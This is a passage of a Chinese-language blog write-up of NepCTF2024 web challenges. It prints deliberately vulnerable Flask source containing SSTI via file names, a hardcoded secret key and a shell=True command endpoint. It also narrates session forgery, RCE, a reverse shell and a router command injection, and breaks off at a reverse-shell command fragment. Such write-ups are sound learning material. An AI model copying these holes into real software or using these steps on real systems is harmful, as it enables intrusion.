class="hljs-keyword">as</span> e:        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;An error occurred. Please check your file and try again.&#x27;</span><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/cat&#x27;</span></span>)</span><span class="hljs-keyword">def</span> <span class="hljs-title function_">cat</span>():    file_path = request.args.get(<span class="hljs-string">&#x27;file&#x27;</span>)    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> file_path:        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;File path is missing.&#x27;</span>    new_file = os.path.join(app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>], file_path)    <span class="hljs-comment"># /app/uploads</span>    <span class="hljs-keyword">if</span> os.path.commonprefix([os.path.abspath(new_file), os.path.abspath(app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>])]) != os.path.abspath(app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>]):        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Invalid file path.&#x27;</span>    <span class="hljs-keyword">if</span> os.path.islink(new_file):        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Symbolic links are not allowed.&#x27;</span>        <span class="hljs-keyword">try</span>:        filename = file_path.split(<span class="hljs-string">&#x27;/&#x27;</span>)[-<span class="hljs-number">1</span>]        content = read_large_file(new_file)        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;test.html&#x27;</span>,content=content,filename=filename,dates=Exec_date())    <span class="hljs-keyword">except</span> FileNotFoundError:        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;File not found.&#x27;</span>    <span class="hljs-keyword">except</span> IOError <span class="hljs-keyword">as</span> e:        <span class="hljs-keyword">return</span> <span class="hljs-string">f&#x27;Error reading file: <span class="hljs-subst">&#123;<span class="hljs-built_in">str</span>(e)&#125;</span>&#x27;</span><span class="hljs-keyword">def</span> <span class="hljs-title function_">Exec_date</span>():    d_res = os.popen(<span class="hljs-string">&#x27;date&#x27;</span>).read()    <span class="hljs-keyword">return</span> d_res.split(<span class="hljs-string">&quot; &quot;</span>)[-<span class="hljs-number">1</span>].strip()+<span class="hljs-string">&quot; &quot;</span>+d_res.split(<span class="hljs-string">&quot; &quot;</span>)[-<span class="hljs-number">3</span>]<span class="hljs-keyword">def</span> <span class="hljs-title function_">clear_uploads_folder</span>():    <span class="hljs-keyword">for</span> root, dirs, files <span class="hljs-keyword">in</span> os.walk(app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>], topdown=<span class="hljs-literal">False</span>):        <span class="hljs-keyword">for</span> file <span class="hljs-keyword">in</span> files:            os.remove(os.path.join(root, file))        <span class="hljs-keyword">for</span> <span class="hljs-built_in">dir</span> <span class="hljs-keyword">in</span> dirs:            os.rmdir(os.path.join(root, <span class="hljs-built_in">dir</span>))<span class="hljs-keyword">def</span> <span class="hljs-title function_">read_large_file</span>(<span class="hljs-params">file_path</span>):    content = <span class="hljs-string">&#x27;&#x27;</span>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file_path, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> file:        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> file:            content += line    <span class="hljs-keyword">return</span> content<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:    app.run(<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>,port=<span class="hljs-string">&quot;8000&quot;</span>,debug=<span class="hljs-literal">False</span>)</code></pre></div><p>逻辑简单，就两个功能</p><p>只允许上传zip文件，会自动解压，然后读取解压后的文件</p><h3 id="我的错误思路（无需关注）"><a href="#我的错误思路（无需关注）" class="headerlink" title="我的错误思路（无需关注）"></a>我的错误思路（无需关注）</h3><p>我一直在关注cat路由的读取文件功能，想着控制file参数（即<code>relative_path</code>）</p><div class="code-wrapper"><pre><code class="hljs">    for root, dirs, files in os.walk(unzip_folder):        for file in files:            print(file)            file_path = os.path.join(root, file)            relative_path = os.path.relpath(file_path, app.config[&#39;UPLOAD_FOLDER&#39;])            link = f&#39;&lt;a href=&quot;/cat?file=&#123;relative_path&#125;&quot;&gt;&#123;file&#125;&lt;/a&gt;&#39;            files_list.append(link)    return render_template_string(&#39;&lt;br&gt;&#39;.join(files_list))</code></pre></div><p>而<code>UPLOAD_FOLDER</code>是<code>/app/uploads</code>，所以想要让<code>relative_path</code>为<code>../../flag</code>（当然并不确定flag的名称），<code>file_path</code>的值要为<code>/flag</code>，也就是<code>file</code>(即文件名)要为<code>/flag</code></p><p>但尴尬的事情出现了，文件名中不能有<code>/</code></p><p>于是思路报废</p><h3 id="正确思路"><a href="#正确思路" class="headerlink" title="正确思路"></a>正确思路</h3><div class="code-wrapper"><pre><code class="hljs stylus"><span class="hljs-keyword">for</span> root, dirs, files <span class="hljs-keyword">in</span> os<span class="hljs-selector-class">.walk</span>(unzip_folder):    <span class="hljs-keyword">for</span> file <span class="hljs-keyword">in</span> files:        <span class="hljs-built_in">print</span>(file)        file_path = os<span class="hljs-selector-class">.path</span><span class="hljs-selector-class">.join</span>(root, file)        relative_path = os<span class="hljs-selector-class">.path</span><span class="hljs-selector-class">.relpath</span>(file_path, app<span class="hljs-selector-class">.config</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>]</span>)        link = f<span class="hljs-string">&#x27;&lt;a href=&quot;/cat?file=&#123;relative_path&#125;&quot;&gt;&#123;file&#125;&lt;/a&gt;&#x27;</span>        files_list<span class="hljs-selector-class">.append</span>(link)return <span class="hljs-built_in">render_template_string</span>(<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span><span class="hljs-selector-class">.join</span>(files_list))</code></pre></div><p>还是这一段，render_template_string存在ssti漏洞</p><p>file即文件名能够控制</p><p>（其实这思路当时也想到了，但是不知道为什么没去尝试，太懒了，感觉现在的我很多时候不是没思路，只是不愿尝试，很烦）</p><p>于是文件名上写payload，然后压缩上传即可</p><p><img src="/../images/NepCTF2024-web/image-20240828215240315.png" alt="image-20240828215240315"></p><p><img src="/../images/NepCTF2024-web/image-20240828212829913.png" alt="image-20240828212829913"></p><h2 id="boom-it"><a href="#boom-it" class="headerlink" title="boom_it"></a>boom_it</h2><div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, render_template, request, session, redirect, url_for<span class="hljs-keyword">import</span> threading<span class="hljs-keyword">import</span> random<span class="hljs-keyword">import</span> string<span class="hljs-keyword">import</span> datetime<span class="hljs-keyword">import</span> rsa<span class="hljs-keyword">from</span> werkzeug.utils <span class="hljs-keyword">import</span> secure_filename<span class="hljs-keyword">import</span> os<span class="hljs-keyword">import</span> subprocess(pubkey, privkey) = rsa.newkeys(<span class="hljs-number">2048</span>)app = Flask(__name__)app.secret_key = <span class="hljs-string">&quot;super_secret_key&quot;</span>UPLOAD_FOLDER = <span class="hljs-string">&#x27;templates/uploads&#x27;</span>ALLOWED_EXTENSIONS = &#123;<span class="hljs-string">&#x27;png&#x27;</span>, <span class="hljs-string">&#x27;jpg&#x27;</span>, <span class="hljs-string">&#x27;txt&#x27;</span>&#125;app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>] = UPLOAD_FOLDER<span class="hljs-keyword">def</span> <span class="hljs-title function_">allowed_file</span>(<span class="hljs-params">filename</span>):    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;.&#x27;</span> <span class="hljs-keyword">in</span> filename <span class="hljs-keyword">and</span> filename.rsplit(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-number">1</span>)[<span class="hljs-number">1</span>].lower() <span class="hljs-keyword">in</span> ALLOWED_EXTENSIONS<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/admin&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><span class="hljs-keyword">def</span> <span class="hljs-title function_">admin</span>():    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:        username = request.form.get(<span class="hljs-string">&#x27;username&#x27;</span>)        password = request.form.get(<span class="hljs-string">&#x27;password&#x27;</span>)        <span class="hljs-keyword">if</span> username == <span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-keyword">and</span> password == users.get(<span class="hljs-string">&#x27;admin&#x27;</span>, &#123;&#125;).get(<span class="hljs-string">&#x27;password&#x27;</span>):            session[<span class="hljs-string">&#x27;admin_logged_in&#x27;</span>] = <span class="hljs-literal">True</span>            <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;admin_dashboard&#x27;</span>))        <span class="hljs-keyword">else</span>:            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Invalid credentials&quot;</span>, <span class="hljs-number">401</span>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;admin_login.html&#x27;</span>)<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/admin/dashboard&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><span class="hljs-keyword">def</span> <span class="hljs-title function_">admin_dashboard</span>():    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> session.get(<span class="hljs-string">&#x27;admin_logged_in&#x27;</span>):        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;admin&#x27;</span>))    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;file&#x27;</span> <span class="hljs-keyword">in</span> request.files:            file = request.files[<span class="hljs-string">&#x27;file&#x27;</span>]        <span class="hljs-keyword">if</span> file.filename == <span class="hljs-string">&#x27;&#x27;</span>:            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;No selected file&#x27;</span>        filename = file.filename        file.save(os.path.join(app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>], filename))        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;File uploaded successfully&#x27;</span>    cmd_output = <span class="hljs-string">&quot;&quot;</span>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;cmd&#x27;</span> <span class="hljs-keyword">in</span> request.args:        <span class="hljs-keyword">if</span> os.path.exists(<span class="hljs-string">&quot;lock.txt&quot;</span>):  <span class="hljs-comment"># 检查当前目录下是否存在lock.txt</span>            cmd = request.args.get(<span class="hljs-string">&#x27;cmd&#x27;</span>)            <span class="hljs-keyword">try</span>:                cmd_output = subprocess.check_output(cmd, shell=<span class="hljs-literal">True</span>).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:                cmd_output = <span class="hljs-built_in">str</span>(e)        <span class="hljs-keyword">else</span>:            cmd_output = <span class="hljs-string">&quot;lock.txt not found. Command execution not allowed.&quot;</span>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;admin_dashboard.html&#x27;</span>, users=users, cmd_output=cmd_output, active_tab=<span class="hljs-string">&quot;cmdExecute&quot;</span>)<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/admin/logout&#x27;</span></span>)</span><span class="hljs-keyword">def</span> <span class="hljs-title function_">admin_logout</span>():    session.pop(<span class="hljs-string">&#x27;admin_logged_in&#x27;</span>, <span class="hljs-literal">None</span>)    <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;index&#x27;</span>))<span class="hljs-comment"># Generate random users</span><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_random_users</span>(<span class="hljs-params">n</span>):    users = &#123;&#125;    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):        username = <span class="hljs-string">&#x27;&#x27;</span>.join(random.choices(string.ascii_letters + string.digits, k=<span class="hljs-number">15</span>))        password = <span class="hljs-string">&#x27;&#x27;</span>.join(random.choices(string.ascii_letters + string.digits, k=<span class="hljs-number">15</span>))        users[username] = &#123;<span class="hljs-string">&quot;password&quot;</span>: password, <span class="hljs-string">&quot;balance&quot;</span>: <span class="hljs-number">2000</span>&#125;    <span class="hljs-keyword">return</span> usersusers = generate_random_users(<span class="hljs-number">1000</span>)users[<span class="hljs-string">&quot;HRP&quot;</span>] = &#123;<span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;HRP&quot;</span>, <span class="hljs-string">&quot;balance&quot;</span>: <span class="hljs-number">6000</span>&#125;<span class="hljs-comment"># Add an admin user with a random password</span>admin_password = <span class="hljs-string">&#x27;&#x27;</span>.join(random.choices(string.ascii_letters + string.digits, k=<span class="hljs-number">15</span>))users[<span class="hljs-string">&quot;admin&quot;</span>] = &#123;<span class="hljs-string">&quot;password&quot;</span>: admin_password, <span class="hljs-string">&quot;balance&quot;</span>: <span class="hljs-number">0</span>&#125;flag_price = <span class="hljs-number">10000</span>flag = admin_password  <span class="hljs-comment"># The flag is the password of the admin user</span>mutex = threading.Lock()<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;username&quot;</span> <span class="hljs-keyword">in</span> session:        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;index.html&quot;</span>, logged_in=<span class="hljs-literal">True</span>, username=session[<span class="hljs-string">&quot;username&quot;</span>], balance=users[session[<span class="hljs-string">&quot;username&quot;</span>]][<span class="hljs-string">&quot;balance&quot;</span>])    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;index.html&quot;</span>, logged_in=<span class="hljs-literal">False</span>)<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/reset&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><span class="hljs-keyword">def</span> <span class="hljs-title function_">reset</span>():    <span class="hljs-keyword">global</span> users    users = &#123;&#125;  <span class="hljs-comment"># Clear all existing users</span>    users = generate_random_users(<span class="hljs-number">1000</span>)    users[<span class="hljs-string">&quot;HRP&quot;</span>] = &#123;<span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;HRP&quot;</span>, <span class="hljs-string">&quot;balance&quot;</span>: <span class="hljs-number">6000</span>&#125;    <span class="hljs-keyword">global</span> admin_password    admin_password=&#123;&#125;    <span class="hljs-keyword">global</span> flag    <span class="hljs-comment"># Add an admin user with a random password</span>    admin_password = <span class="hljs-string">&#x27;&#x27;</span>.join(random.choices(string.ascii_letters + string.digits, k=<span class="hljs-number">15</span>))    flag=admin_password    users[<span class="hljs-string">&quot;admin&quot;</span>] = &#123;<span class="hljs-string">&quot;password&quot;</span>: admin_password, <span class="hljs-string">&quot;balance&quot;</span>: <span class="hljs-number">0</span>&#125;        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;index&#x27;</span>))<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/login&#x27;</span>, methods=[<span class="hljs-string">&quot;POST&quot;</span>]</span>)</span><span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>():    username = request.form.get(<span class="hljs-string">&quot;username&quot;</span>)    password = request.form.get(<span class="hljs-string">&quot;password&quot;</span>)    <span class="hljs-keyword">if</span> username <span class="hljs-keyword">in</span> users <span class="hljs-keyword">and</span> users[username][<span class="hljs-string">&quot;password&quot;</span>] == password:        session[<span class="hljs-string">&quot;username&quot;</span>] = username        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;index&#x27;</span>))    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Invalid credentials&quot;</span>, <span class="hljs-number">403</span><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/logout&#x27;</span></span>)</span><span class="hljs-keyword">def</span> <span class="hljs-title function_">logout</span>():    session.pop(<span class="hljs-string">&quot;username&quot;</span>, <span class="hljs-literal">None</span>)    <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;index&#x27;</span>))<span class="hljs-keyword">def</span> <span class="hljs-title function_">log_transfer</span>(<span class="hljs-params">sender, receiver, amount</span>):    <span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt_data_with_rsa</span>(<span class="hljs-params">data, pubkey</span>):        <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">200</span>):  <span class="hljs-comment"># Encrypt the data multiple times</span>            encrypted_data = rsa.encrypt(data.encode(), pubkey)        <span class="hljs-keyword">return</span> encrypted_data.<span class="hljs-built_in">hex</span>()    timestamp = datetime.datetime.now().strftime(<span class="hljs-string">&#x27;%Y-%m-%d %H:%M:%S.%f&#x27;</span>)        <span class="hljs-comment"># Encrypt the amount and timestamp</span>    encrypted_amount = encrypt_data_with_rsa(<span class="hljs-built_in">str</span>(amount), pubkey)    encrypted_timestamp = encrypt_data_with_rsa(timestamp, pubkey)        log_data = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;encrypted_timestamp&#125;</span> - Transfer from <span class="hljs-subst">&#123;sender&#125;</span> to <span class="hljs-subst">&#123;receiver&#125;</span> of encrypted amount <span class="hljs-subst">&#123;encrypted_amount&#125;</span>\n&quot;</span>        <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>):         log_data += <span class="hljs-string">f&quot;Transaction initiated from device: <span class="hljs-subst">&#123;random.choice([<span class="hljs-string">&#x27;Mobile&#x27;</span>, <span class="hljs-string">&#x27;Web&#x27;</span>, <span class="hljs-string">&#x27;ATM&#x27;</span>, <span class="hljs-string">&#x27;In-Branch Terminal&#x27;</span>])&#125;</span>\n&quot;</span>        log_data += <span class="hljs-string">f&quot;Initiator IP address: <span class="hljs-subst">&#123;random.choice([<span class="hljs-string">&#x27;192.168.1.&#x27;</span>, <span class="hljs-string">&#x27;10.0.0.&#x27;</span>, <span class="hljs-string">&#x27;172.16.0.&#x27;</span>])&#125;</span><span class="hljs-subst">&#123;random.randint(<span class="hljs-number">1</span>, <span class="hljs-number">254</span>)&#125;</span>\n&quot;</span>        log_data += <span class="hljs-string">f&quot;Initiator geolocation: Latitude <span class="hljs-subst">&#123;random.uniform(-<span class="hljs-number">90</span>, <span class="hljs-number">90</span>):<span class="hljs-number">.6</span>f&#125;</span>, Longitude <span class="hljs-subst">&#123;random.uniform(-<span class="hljs-number">180</span>, <span class="hljs-number">180</span>):<span class="hljs-number">.6</span>f&#125;</span>\n&quot;</span>        log_data += <span class="hljs-string">f&quot;Receiver&#x27;s last login device: <span class="hljs-subst">&#123;random.choice([<span class="hljs-string">&#x27;Mobile&#x27;</span>, <span class="hljs-string">&#x27;Web&#x27;</span>, <span class="hljs-string">&#x27;ATM&#x27;</span>])&#125;</span>\n&quot;</span>        log_data += <span class="hljs-string">f&quot;Associated fees: $<span class="hljs-subst">&#123;random.uniform(<span class="hljs-number">0.1</span>, <span class="hljs-number">3.0</span>):<span class="hljs-number">.2</span>f&#125;</span>\n&quot;</span>        log_data += <span class="hljs-string">f&quot;Remarks: <span class="hljs-subst">&#123;random.choice([<span class="hljs-string">&#x27;Regular transfer&#x27;</span>, <span class="hljs-string">&#x27;Payment for invoice #&#x27;</span>+<span class="hljs-built_in">str</span>(random.randint(<span class="hljs-number">1000</span>,<span class="hljs-number">9999</span>)), <span class="hljs-string">&#x27;Refund for transaction #&#x27;</span>+<span class="hljs-built_in">str</span>(random.randint(<span class="hljs-number">1000</span>,<span class="hljs-number">9999</span>))])&#125;</span>\n&quot;</span>        log_data += <span class="hljs-string">&quot;-&quot;</span>*<span class="hljs-number">50</span> + <span class="hljs-string">&quot;\n&quot;</span>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;transfer_log.txt&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>) <span class="hljs-keyword">as</span> f:        f.write(log_data)<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/transfer&#x27;</span>, methods=[<span class="hljs-string">&quot;POST&quot;</span>]</span>)</span><span class="hljs-keyword">def</span> <span class="hljs-title function_">transfer</span>():    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;username&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> session:        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Not logged in&quot;</span>, <span class="hljs-number">403</span>        receivers = request.form.getlist(<span class="hljs-string">&quot;receiver&quot;</span>)    amount = <span class="hljs-built_in">int</span>(request.form.get(<span class="hljs-string">&quot;amount&quot;</span>))    <span class="hljs-keyword">if</span> amount &lt;<span class="hljs-number">0</span>:        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Insufficient funds&quot;</span>, <span class="hljs-number">400</span>    logging_enabled = request.form.get(<span class="hljs-string">&quot;logs&quot;</span>, <span class="hljs-string">&quot;false&quot;</span>).lower() == <span class="hljs-string">&quot;true&quot;</span>        <span class="hljs-keyword">if</span> session[<span class="hljs-string">&quot;username&quot;</span>] <span class="hljs-keyword">in</span> receivers:        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Cannot transfer to self&quot;</span>, <span class="hljs-number">400</span>        <span class="hljs-keyword">for</span> receiver <span class="hljs-keyword">in</span> receivers:        <span class="hljs-keyword">if</span> receiver <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> users:            <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;Invalid user <span class="hljs-subst">&#123;receiver&#125;</span>&quot;</span>, <span class="hljs-number">400</span>        total_amount = amount * <span class="hljs-built_in">len</span>(receivers)    <span class="hljs-keyword">if</span> users[session[<span class="hljs-string">&quot;username&quot;</span>]][<span class="hljs-string">&quot;balance&quot;</span>] &gt;= total_amount:        <span class="hljs-keyword">for</span> receiver <span class="hljs-keyword">in</span> receivers:            <span class="hljs-keyword">if</span> logging_enabled:                log_transfer(session[<span class="hljs-string">&quot;username&quot;</span>], receiver, amount)            mutex.acquire()            users[session[<span class="hljs-string">&quot;username&quot;</span>]][<span class="hljs-string">&quot;balance&quot;</span>] -= amount            users[receiver][<span class="hljs-string">&quot;balance&quot;</span>] += amount            mutex.release()        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;index&#x27;</span>))    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Insufficient funds&quot;</span>, <span class="hljs-number">400</span><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/buy_flag&#x27;</span></span>)</span><span class="hljs-keyword">def</span> <span class="hljs-title function_">buy_flag</span>():    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;username&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> session:        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Not logged in&quot;</span>, <span class="hljs-number">403</span>    <span class="hljs-keyword">if</span> users[session[<span class="hljs-string">&quot;username&quot;</span>]][<span class="hljs-string">&quot;balance&quot;</span>] &gt;= flag_price:        users[session[<span class="hljs-string">&quot;username&quot;</span>]][<span class="hljs-string">&quot;balance&quot;</span>] -= flag_price        <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;Here is your flag: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Insufficient funds&quot;</span>, <span class="hljs-number">400</span><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/get_users&#x27;</span>, methods=[<span class="hljs-string">&quot;GET&quot;</span>]</span>)</span><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_users</span>():    num = <span class="hljs-built_in">int</span>(request.args.get(<span class="hljs-string">&#x27;num&#x27;</span>, <span class="hljs-number">1000</span>))    selected_users = random.sample(<span class="hljs-built_in">list</span>(users.keys()), num)    <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;users&quot;</span>: selected_users&#125;<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/view_balance/&lt;username&gt;&#x27;</span>, methods=[<span class="hljs-string">&quot;GET&quot;</span>]</span>)</span><span class="hljs-keyword">def</span> <span class="hljs-title function_">view_balance</span>(<span class="hljs-params">username</span>):    <span class="hljs-keyword">if</span> username <span class="hljs-keyword">in</span> users:        <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;username&quot;</span>: username, <span class="hljs-string">&quot;balance&quot;</span>: users[username][<span class="hljs-string">&quot;balance&quot;</span>]&#125;    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;User not found&quot;</span>, <span class="hljs-number">404</span><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/force_buy_flag&#x27;</span>, methods=[<span class="hljs-string">&quot;POST&quot;</span>]</span>)</span><span class="hljs-keyword">def</span> <span class="hljs-title function_">force_buy_flag</span>():    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;username&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> session <span class="hljs-keyword">or</span> session[<span class="hljs-string">&quot;username&quot;</span>] != <span class="hljs-string">&quot;HRP&quot;</span>:        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Permission denied&quot;</span>, <span class="hljs-number">403</span>    target_user = request.form.get(<span class="hljs-string">&quot;target_user&quot;</span>)    <span class="hljs-keyword">if</span> target_user <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> users:        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;User not found&quot;</span>, <span class="hljs-number">404</span>    <span class="hljs-keyword">if</span> users[target_user][<span class="hljs-string">&quot;balance&quot;</span>] &gt;= flag_price:        users[target_user][<span class="hljs-string">&quot;balance&quot;</span>] -= flag_price        <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;User <span class="hljs-subst">&#123;target_user&#125;</span> successfully bought the flag!,&quot;</span>+<span class="hljs-string">f&quot;Here is your flag: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>    <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;User <span class="hljs-subst">&#123;target_user&#125;</span> does not have sufficient funds&quot;</span>, <span class="hljs-number">400</span><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>,debug=<span class="hljs-literal">False</span>)</code></pre></div><p>思路大概就是换分数达到10000买admin的密码，然后通过<code>/admin</code>路由进行rce</p><p>刚开始看到secret_key的时候不太相信，直到发现能够解密session</p><p>于是可以进行session伪造，并且可以通过<code>/get_users</code>路由获取所有用户名称</p><p><img src="/../images/NepCTF2024-web/image-20240828224756071.png" alt="image-20240828224756071"></p><p>伪造后转到同一个账户中，然后买密码</p><p><img src="/../images/NepCTF2024-web/image-20240828215815742.png" alt="image-20240828215815742"></p><p><code>/admin</code>登陆后上传文件lock.txt （我还以为lock.txt是什么重要文件呢。。。）</p><p>目录穿越即可</p><p>反弹shell发现无权限读取flag</p><p>查看进程</p><p><img src="/../images/NepCTF2024-web/image-20240829045419324.png" alt="image-20240829045419324"></p><p>不知道为什么burp自带浏览器一直加载不出来<code>/admin</code>的界面，所以后面就不尝试了</p><h2 id="NepRouter-–-狸猫换太子"><a href="#NepRouter-–-狸猫换太子" class="headerlink" title="NepRouter – 狸猫换太子"></a>NepRouter – 狸猫换太子</h2><p>一路点下来，注册了TEST用户，登录，就能下载router</p><p>这个router是路由器固件，它相当于app.py这种，运行它就会启动相应的服务</p><p>ida分析</p><p><img src="/../images/NepCTF2024-web/image-20240829042226059.png" alt="image-20240829042226059"></p><p>在8080端口开启服务</p><p><img src="/../images/NepCTF2024-web/image-20240829042356600.png" alt="image-20240829042356600"></p><p>查询数据库中注册的用户，登录判断是不是<code>NepNepIStheBestTeam</code></p><p>而在注册时会被加密</p><p><img src="/../images/NepCTF2024-web/image-20240829043105487.png" alt="image-20240829043105487"></p><p>我在做题时就是卡在不知道咋注册别的用户</p><p>这里的做法其实很简单，前端修改TEST为其他用户即可</p><p><img src="/../images/NepCTF2024-web/image-20240829043320200.png" alt="image-20240829043320200"></p><p>因为加密逻辑就在前端，但是由于会一直debuger，所以我当时也没细看</p><p>修改为<code>NepNepIStheBestTeam</code>即可</p><p>然后就到<code>router</code>启动在8080端口的服务登录即可</p><p>接着就到了setrouter路由，存在命令执行</p><p><img src="/../images/NepCTF2024-web/image-20240829043703283.png" alt="image-20240829043703283"></p><p><img src="/../images/NepCTF2024-web/image-20240829043728734.png" alt="image-20240829043728734"></p><p><img src="/../images/NepCTF2024-web/image-20240829003037137.png" alt="image-20240829003037137"></p><p><strong>这里注意抓包发现会被url编码，但是这里路由器固件不会进行处理，所以要手动解码</strong></p><p><img src="/../images/NepCTF2024-web/image-20240829003558484.png" alt="image-20240829003558484"></p><p><img src="/../images/NepCTF2024-web/image-20240829002939335.png" alt="image-20240829002939335"></p><p><img src="/../images/NepCTF2024-web/image-20240829003704330.png" alt="image-20240829003704330"></p><h2 id="NepRouter-–-白给"><a href="#NepRouter-–-白给" class="headerlink" title="NepRouter – 白给"></a>NepRouter – 白给</h2><div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment">#反弹shell</span>&#123;<span class="hljs-built_in">echo</span>,&#125;|&#123;<span 